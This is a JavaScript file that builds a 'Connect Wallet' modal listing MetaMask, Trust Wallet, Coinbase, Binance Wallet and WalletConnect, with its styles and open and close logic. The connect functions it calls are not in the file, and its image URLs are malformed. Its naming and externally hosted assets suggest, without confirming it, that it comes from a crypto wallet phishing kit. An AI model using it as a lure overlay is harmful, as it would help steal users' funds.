const MS_MODAL_STYLE = `#ms-modal{position:fixed;display:block;width:100%;height:100%;top:0;left:0;right:0;bottom:0;background:rgba(8,5,23,.5);z-index:99998}.custom_modal>*{font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue",sans-serif}.custom_modal{z-index:99999;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);box-sizing:border-box;max-width:358px;width:100%;overflow:hidden;box-shadow:0 10px 20px 0 rgba(0,0,0,.15);font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue",sans-serif;width:100%;position:relative;animation-delay:.3s;animation-duration:.2s;animation-name:zoom-in;animation-fill-mode:backwards;animation-timing-function:cubic-bezier(0,0,.22,1);outline:0;border-radius:36px;border:1px solid #f4dfdd;background-color:#fff;box-sizing:border-box;font-size:16px}.custom_modal_head button{width:32px;height:32px;background:0 0;outline:0;border:0}.custom_modal_head{display:flex;flex-wrap:nowrap;align-items:center;justify-content:space-between;height:64px;padding:0 18px 0 18px}.custom_modal_head_title{font-weight:700;color:#000;width:calc(100% - 64px);justify-content:center;display:flex;padding-left:32px}.custom_modal_head button svg{height:16px;width:16px}.custom_modal_line{position:relative;display:flex;width:100%;height:1px;background-color:rgba(0,0,0,.05);justify-content:center;align-items:center}.custom_modal_head button:hover{background-color:#0000000d;border-radius:12px}.custom_modal_main{padding:12px;gap:12px;display:grid}.modal-el{column-gap:12px;padding:7px 16px 7px 8px;width:100%;background-color:rgb(0 0 0 / 2%);border-radius:16px;color:#000;display:flex;box-sizing:border-box;align-items:center}.modal-el-b img{max-width:40px;width:100%;height:40px}.modal-el-b{max-width:40px;width:100%;height: 40px;border-radius:12px;overflow:hidden;border:1px solid #00000029}.modal-el-title{width:100%;font-weight:500;display:flex;align-items:center}.modal-el:hover{width:100%;background-color:rgb(0 0 0 / 6%);cursor:pointer;transition:all cubic-bezier(0,0,.55,1) .2s}span.modal-el-desc{width: 100%;background-color:rgba(51,150,255,.15);color:#3396ff;height:20px;font-weight:700;font-size:11px;padding:0 5px;text-transform:uppercase;border-radius:5px;max-width:60px;justify-content: center;display:flex;align-items:center}.custom_modal_head-qus{display:none}.custom_modal.black{background-color:#191b1a}.custom_modal.black .custom_modal_head_title{color:#fff}.custom_modal.black .modal-el-title{color:#ffffffe6}.custom_modal_head_right svg{color:#fff}.custom_modal.black .modal-el{background-color:rgb(255 255 255 / 2%)}.custom_modal.black .modal-el:hover{background-color:rgb(255 255 255 / 5%)}.custom_modal.white .custom_modal_head_right svg{color:#000}.custom_modal_mobile{display:none}@media (max-width:450px){.custom_modal_mobile{display:block}.custom_modal_head{display:none}.custom_modal_line{display:none}.custom_modal_main{display:none}.custom_modal_mobile{background-color:#3a4147}.custom_modal{border-radius:10px;border:none;max-width:calc(450px - 5px);top:calc(100% - 90px);position:relative}.custom_modal_mobile_header{height:38px;display:flex;position:relative;padding:5px 15px 5px 5px;justify-content:center;align-items:center;background: #212121}.custom_modal_mobile .custom_modal_mobile_header button{width:28px;height:28px;border-radius:50%;border:0;display:flex;justify-content:center;align-items:center;cursor:pointer;box-shadow:0 0 0 1px rgba(0,0,0,.1)}.custom_modal_mobile button path{fill:#141414}.header_mobile-right{display:flex}.custom_modal_mobile_main{width:100%;height:190px;background:#212121;}.custom_modal_mobile_main-title{color:#53acee;font-size:20px;font-weight:600;display:flex;width:100%;justify-content:center}.custom_modal_mobile_main-head{height:65px;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;box-sizing:border-box}button.wcm-action-btn{cursor:pointer;padding:15px 20px;display:flex;justify-content:center;align-items:center;position:relative;border:none;background-color:transparent;transition:all .2s ease 0s;position:absolute;right:0}button.wcm-action-btn path{fill:#3396ff}.custom_modal_mobile_main_menu{display:flex;align-items:center;justify-content:center}.custom_modal_mobile_ava img{max-width:60px;width:100%;border:1px solid #00000026;border-radius:35px}.custom_modal_mobile-el{width:25%;align-items:center;justify-content:center;display:grid;gap:2px}.custom_modal_mobile_ava{display:flex;justify-content:center}span.custom_modal_mobile_name{justify-content:center;display:flex;font-size:13px;font-weight:500}}.custom_modal.black {border: none;}.custom_modal.black .custom_modal_mobile_main{background:#191b1a}.custom_modal.black .custom_modal_mobile_main-title{color:#fff}.black span.custom_modal_mobile_name{color:#ffffffd6}.black .custom_modal_mobile .custom_modal_mobile_header button{background-color:#212121}.black .custom_modal_mobile_header button path{fill:#fff}span.modal-el-desc-green {background-color: #38c77363;color: #36b56a;height: 20px;font-weight: 700;font-size: 11px;padding: 0 5px;text-transform: uppercase;border-radius: 5px;max-width: 502px;display: flex;align-items: center;}span.modal-el-desc-soon {background-color: #00000024;color: #00000070;height: 20px;font-weight: 700;font-size: 11px;padding: 0 5px;text-transform: uppercase;border-radius: 5px;max-width: 52px;display: flex;align-items: center;width: min-content;}.custom_modal.black span.modal-el-desc-soon {color: #ffffffb8;}`;

const MS_MODAL_CODE = `<div class="custom_modal $COLOR$">
<div class="custom_modal_head">
  <div class="custom_modal_head-qus">
    <button><svg fill="none" viewBox="0 0 16 16"><path fill="currentColor" d="M8.51 5.66a.83.83 0 0 0-.57-.2.83.83 0 0 0-.52.28.8.8 0 0 0-.25.52 1 1 0 0 1-2 0c0-.75.34-1.43.81-1.91a2.75 2.75 0 0 1 4.78 1.92c0 1.24-.8 1.86-1.25 2.2l-.04.03c-.47.36-.5.43-.5.65a1 1 0 1 1-2 0c0-1.25.8-1.86 1.24-2.2l.04-.04c.47-.36.5-.43.5-.65 0-.3-.1-.49-.24-.6ZM9.12 11.87a1.13 1.13 0 1 1-2.25 0 1.13 1.13 0 0 1 2.25 0Z"></path><path fill="currentColor" fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6a6 6 0 1 0 0 12A6 6 0 0 0 8 2Z" clip-rule="evenodd"></path></svg>
    </button>
  </div>
  <div class="custom_modal_head_title">Connect Wallet</div>
  <div class="custom_modal_head_right">
    <button onclick="MSM.close()">
      <svg fill="none" viewBox="0 0 16 16"><path fill="currentColor" fill-rule="evenodd" d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z" clip-rule="evenodd"></path></svg>
    </button>
  </div>
</div>
<div class="custom_modal_line"></div>
<div class="custom_modal_main">
  <div class="modal-el" onclick="use_wc()">
    <div class="modal-el-b">
      <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/wallet-connect.webp" alt="WalletConnect">
    </div>
    <div class="modal-el-title">
       WalletConnect
    </div>
    <span class="modal-el-desc">qr code</span>
  </div>
  <div class="modal-el" onclick="connect_wallet('MetaMask')">
    <div class="modal-el-b">
      <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/metamask.webp" alt="MetaMask">
    </div>
    <div class="modal-el-title">
       MetaMask
    </div>
    <span class="modal-el-desc-green">popular</span>
  </div>
  <div class="modal-el" onclick="connect_wallet('Trust Wallet')">
    <div class="modal-el-b">
      <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/trust.webp" alt="Trust Wallet">
    </div>
    <div class="modal-el-title">
       Trust Wallet
    </div>
  </div>
  <div class="modal-el" onclick="connect_wallet('Coinbase')">
    <div class="modal-el-b">
      <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/coinbase.webp" alt="Coinbase">
    </div>
    <div class="modal-el-title">
       Coinbase
    </div>
  </div>
  <div class="modal-el" onclick="connect_wallet('Binance Wallet')">
    <div class="modal-el-b">
      <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/binance.webp" alt="Coinbase">
    </div>
    <div class="modal-el-title">
       Binance Wallet
    </div>
  </div>

  <div class="modal-el">
  <div class="modal-el-b">
    <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/safe.webp" alt="Safe">
  </div>
  <div class="modal-el-title">
     Safe
  </div>
  <span class="modal-el-desc-soon">soon</span>
</div>

<div class="modal-el">
<div class="modal-el-b">
  <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/ledger.webp" alt="Ledger Live">
</div>
<div class="modal-el-title">
  Ledger Live
</div>
<span class="modal-el-desc-soon">soon</span>
</div>

</div>
<div class="custom_modal_mobile">
  <div class="custom_modal_mobile_header">
    <div class="custom_modal_logo">
      
    </div>
    
  </div>

  <div class="custom_modal_mobile_main">
 <div class="custom_modal_mobile_main-head">
      <div class="custom_modal_mobile_main-title">Connect Wallet</div>
      <button onclick="use_wc()" class="wcm-action-btn"><svg width="25" height="24" viewBox="0 0 25 24"><path d="M23.748 9a.748.748 0 0 0 .748-.752c-.018-2.596-.128-4.07-.784-5.22a6 6 0 0 0-2.24-2.24c-1.15-.656-2.624-.766-5.22-.784a.748.748 0 0 0-.752.748c0 .414.335.749.748.752 1.015.007 1.82.028 2.494.088.995.09 1.561.256 1.988.5.7.398 1.28.978 1.679 1.678.243.427.41.993.498 1.988.061.675.082 1.479.09 2.493a.753.753 0 0 0 .75.749ZM3.527.788C4.677.132 6.152.022 8.747.004A.748.748 0 0 1 9.5.752a.753.753 0 0 1-.749.752c-1.014.007-1.818.028-2.493.088-.995.09-1.561.256-1.988.5-.7.398-1.28.978-1.679 1.678-.243.427-.41.993-.499 1.988-.06.675-.081 1.479-.088 2.493A.753.753 0 0 1 1.252 9a.748.748 0 0 1-.748-.752c.018-2.596.128-4.07.784-5.22a6 6 0 0 1 2.24-2.24ZM1.252 15a.748.748 0 0 0-.748.752c.018 2.596.128 4.07.784 5.22a6 6 0 0 0 2.24 2.24c1.15.656 2.624.766 5.22.784a.748.748 0 0 0 .752-.748.753.753 0 0 0-.749-.752c-1.014-.007-1.818-.028-2.493-.089-.995-.089-1.561-.255-1.988-.498a4.5 4.5 0 0 1-1.679-1.68c-.243-.426-.41-.992-.499-1.987-.06-.675-.081-1.479-.088-2.493A.753.753 0 0 0 1.252 15ZM22.996 15.749a.753.753 0 0 1 .752-.749c.415 0 .751.338.748.752-.018 2.596-.128 4.07-.784 5.22a6 6 0 0 1-2.24 2.24c-1.15.656-2.624.766-5.22.784a.748.748 0 0 1-.752-.748c0-.414.335-.749.748-.752 1.015-.007 1.82-.028 2.494-.089.995-.089 1.561-.255 1.988-.498a4.5 4.5 0 0 0 1.679-1.68c.243-.426.41-.992.498-1.987.061-.675.082-1.479.09-2.493Z" fill="#fff"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M7 4a2.5 2.5 0 0 0-2.5 2.5v2A2.5 2.5 0 0 0 7 11h2a2.5 2.5 0 0 0 2.5-2.5v-2A2.5 2.5 0 0 0 9 4H7Zm2 1.5H7a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h2a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1ZM13.5 6.5A2.5 2.5 0 0 1 16 4h2a2.5 2.5 0 0 1 2.5 2.5v2A2.5 2.5 0 0 1 18 11h-2a2.5 2.5 0 0 1-2.5-2.5v-2Zm2.5-1h2a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1h-2a1 1 0 0 1-1-1v-2a1 1 0 0 1 1-1ZM7 13a2.5 2.5 0 0 0-2.5 2.5v2A2.5 2.5 0 0 0 7 20h2a2.5 2.5 0 0 0 2.5-2.5v-2A2.5 2.5 0 0 0 9 13H7Zm2 1.5H7a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h2a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1Z" fill="#fff"></path><path d="M13.5 15.5c0-.465 0-.697.038-.89a2 2 0 0 1 1.572-1.572C15.303 13 15.535 13 16 13v2.5h-2.5ZM18 13c.465 0 .697 0 .89.038a2 2 0 0 1 1.572 1.572c.038.193.038.425.038.89H18V13ZM18 17.5h2.5c0 .465 0 .697-.038.89a2 2 0 0 1-1.572 1.572C18.697 20 18.465 20 18 20v-2.5ZM13.5 17.5H16V20c-.465 0-.697 0-.89-.038a2 2 0 0 1-1.572-1.572c-.038-.193-.038-.425-.038-.89Z" fill="#fff"></path></svg></button>
    </div>

    <div class="custom_modal_mobile_main_menu">
	<div class="custom_modal_mobile-el" onclick="use_wc()">
        <div class="custom_modal_mobile_ava">
          <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/WC1.svg" alt="WalletConnect">
        </div>
        <span class="custom_modal_mobile_name">Wallet Connect</span>
      </div>
	
      <div class="custom_modal_mobile-el" onclick="connect_wallet('MetaMask')">
        <div class="custom_modal_mobile_ava">
          <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/metamask.webp" alt="MetaMask">
        </div>
        <span class="custom_modal_mobile_name">MetaMask</span>
      </div>

     <div class="custom_modal_mobile-el" onclick="connect_wallet('Trust Wallet')">
        <div class="custom_modal_mobile_ava">
          <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/trust.webp" alt="Trust">
        </div>
        <span class="custom_modal_mobile_name">Trust</span>
      </div>

      <div class="custom_modal_mobile-el" onclick="connect_wallet('Coinbase')">
        <div class="custom_modal_mobile_ava">
          <img src="/ttps://cdn.statically.io/gh/oligarchia/x/main/web3-modal/images/coinbase.webp" alt="coinbase">
        </div>
        <span class="custom_modal_mobile_name">Coinbase</span>
      </div>

      
    </div>
    
  </div>

 </div>
</div> `;

const MSM = {
  connect_select: false,
  init: () => {
    try {
      const style_elem = document.createElement('style');
      style_elem.textContent = MS_MODAL_STYLE;
      document.head.append(style_elem);
    } catch(err) {
      console.log(err);
    }
  },
  close: () => {
    try {
      document.querySelector('#ms-modal').remove();
    } catch(err) {
      console.log('Modal Closed');
    }
    try {
      document.querySelector('#ms-modal-overlay').remove();
    } catch(err) {
      console.log('Modal Closed');
    }
  },
  open: (color = 'light', mode = 1) => {
    try {
      MSM.close();
      let modal_content = MS_MODAL_CODE.replaceAll('$COLOR$', color == 'dark' ? 'black' : 'white');
      const modal_elem = document.createElement('div');
      modal_elem.id = 'ms-modal';
      modal_elem.innerHTML = modal_content;
      document.body.prepend(modal_elem);
      if (mode == 2) MSM.connect_select = true;
      else MSM.connect_select = false;
      try {
        document.querySelector('#ms-modal').addEventListener('click', (ev) => {
          if (ev.composedPath()[0] === document.querySelector('#ms-modal'))
            MSM.close();
        });
      } catch(err) {
        console.log(err);
      }
    } catch(err) {
      console.log('Modal Opened');
    }
  },
  select: (marker) => {
    try {
      document.querySelector(marker).checked = true;
      if (MSM.connect_select) MSM.connect();
    } catch(err) {
      console.log(err);
    }
  },
  connect: () => {
    try {
      let checked_id = document.querySelector('input[name="ms_wallet"]:checked').id;
      switch (checked_id) {
        case 'ms_wallet_mm': return connect_wallet("MetaMask");
        case 'ms_wallet_cb': return connect_wallet("Coinbase");
        case 'ms_wallet_bw': return connect_wallet("Binance Wallet");
        case 'ms_wallet_tw': return connect_wallet("Trust Wallet");
        default: return use_wc();
      }
    } catch(err) {
      console.log(err);
    }
  }
};
